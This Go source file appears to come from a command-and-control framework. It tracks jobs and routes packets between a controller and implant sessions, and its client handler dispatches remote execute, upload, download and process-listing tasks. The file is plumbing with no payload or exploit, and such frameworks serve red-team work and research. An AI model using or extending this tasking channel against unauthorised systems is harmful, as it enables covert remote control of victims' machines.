package c2

import (
	"context"
	"fmt"

	"github.com/iDigitalFlame/xmt/xmt/c2/action"
	"github.com/iDigitalFlame/xmt/xmt/com"
	"github.com/iDigitalFlame/xmt/xmt/util"
)

// Job is a struct that is used to track and manage
// Tasks given to Session Clients. This struct has function
// callbacks that can be used to watch for completion and also
// offers a Wait function to pause execution until a response is received.
type Job struct {
	ID          uint16
	Result      *com.Packet
	Done, Error func(*Session, *com.Packet)

	ctx    context.Context
	cancel context.CancelFunc
}
type muxClient bool
type muxServer struct {
	active     map[uint16]*Job
	controller *Server
}

// NewJob creates a new Job struct and initializes the context and
// cancel objects inside. The provided uint16 is the Job ID.
func NewJob(i uint16) *Job {
	return NewJobContext(context.Background(), i)
}
func (muxClient) Handle(s *Session, p *com.Packet) {
	s.controller.Log.Debug("[%s:Mux] Received packet \"%s\"...", s.ID, p.String())
	switch p.ID {
	case MsgUpload:
		Process(action.Upload, s, p)
	case MsgRefresh:
		Process(action.Refresh, s, p)
	case MsgExecute:
		Process(action.Execute, s, p)
	case MsgDownload:
		Process(action.Download, s, p)
	case MsgProcesses:
		Process(action.ProcessList, s, p)
	case MsgHello, MsgPing, MsgSleep, MsgRegistered:
		return
	}
}

// NewJobContext creates a new Job struct and initializes the context and
// cancel objects inside. The provided uint16 is the Job ID and the context
// is the parent context, which will be used to cancel the Job if the parent
// cancels.
func NewJobContext(x context.Context, i uint16) *Job {
	j := &Job{ID: i}
	j.ctx, j.cancel = context.WithCancel(x)
	return j
}
func (m *muxServer) Handle(s *Session, p *com.Packet) {
	if s == nil {
		return
	}
	j, ok := m.active[p.Job]
	if !ok {
		m.controller.Log.Warning("[%s:Mux] Received an un-tracked Job ID %d!", m.controller.name, p.Job)
		return
	}
	m.controller.Log.Trace("[%s:Mux] Received response for Job ID %d.", p.Device, j.ID)
	j.Result = p
	if p.Flags&com.FlagError != 0 && j.Error != nil {
		m.controller.events <- &callback{
			packet:     p,
			session:    s,
			packetFunc: j.Error,
		}
	} else if j.Done != nil {
		m.controller.events <- &callback{
			packet:     p,
			session:    s,
			packetFunc: j.Done,
		}
	}
	delete(m.active, j.ID)
	j.cancel()
}
func (m *muxServer) Schedule(s *Session, p *com.Packet) (*Job, error) {
	if p.Job == 0 {
		p.Job = uint16(util.Rand.Uint32())
	}
	if _, ok := m.active[p.Job]; ok {
		return nil, fmt.Errorf("job ID %d is already being tracked", p.Job)
	}
	if err := s.WritePacket(p); err != nil {
		return nil, err
	}
	j := NewJobContext(m.controller.ctx, p.Job)
	m.active[p.Job] = j
	return j, nil
}

/*
func (m muxClientDefault) server(s *Session, p *com.Packet) {
	fmt.Printf("srv %s: %s\n", s, p)
	if p.Flags&com.FlagError != 0 {
		v, _ := p.StringVal()
		fmt.Printf("error: %s\n", v)
	} else {

		b := make([]byte, 8096)
		n, err := p.Read(b)
		fmt.Printf("Payload %d %s:\n%s\n", n, err, b)
	}
}*/
